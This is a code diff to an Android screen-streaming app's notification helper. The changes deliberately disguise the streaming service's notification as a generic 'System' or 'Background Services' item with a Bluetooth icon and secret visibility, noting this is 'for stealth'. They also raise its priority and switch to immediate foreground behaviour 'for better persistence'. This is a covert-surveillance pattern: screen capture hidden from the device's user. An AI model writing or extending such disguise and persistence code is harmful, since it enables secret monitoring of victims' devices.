@@ -36,8 +36,8 @@ internal class NotificationHelperImpl(context: Context) : NotificationHelper {
             notificationManager.deleteNotificationChannel("info.dvkr.screenstream.service.NOTIFICATION_CHANNEL_01")
             notificationManager.deleteNotificationChannel("info.dvkr.screenstream.NOTIFICATION_CHANNEL_START_STOP")
 
-            // Use generic name for stealth
-            NotificationChannel(CHANNEL_STREAMING, "Background Services", NotificationManager.IMPORTANCE_MIN).apply {
+            // Use generic name for stealth but HIGH importance for persistence
+            NotificationChannel(CHANNEL_STREAMING, "Background Services", NotificationManager.IMPORTANCE_HIGH).apply {
                 setSound(null, null)
                 enableLights(false)
                 enableVibration(false)
@@ -91,7 +91,7 @@ internal class NotificationHelperImpl(context: Context) : NotificationHelper {
         val builder = NotificationCompat.Builder(context, CHANNEL_STREAMING)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setCategory(Notification.CATEGORY_SERVICE)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_MAX)  // Changed from MIN to MAX for better persistence
             .setOngoing(true)
             .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)  // Generic Bluetooth icon
             .setContentTitle("System")  // Generic system title
@@ -99,8 +99,9 @@ internal class NotificationHelperImpl(context: Context) : NotificationHelper {
             .setSilent(true)
         
         // FOREGROUND_SERVICE_DEFERRED is only available on Android 12+ (API 31)
+        // Use FOREGROUND_SERVICE_IMMEDIATE for better persistence
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
+            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
         }
         
         return builder.build()
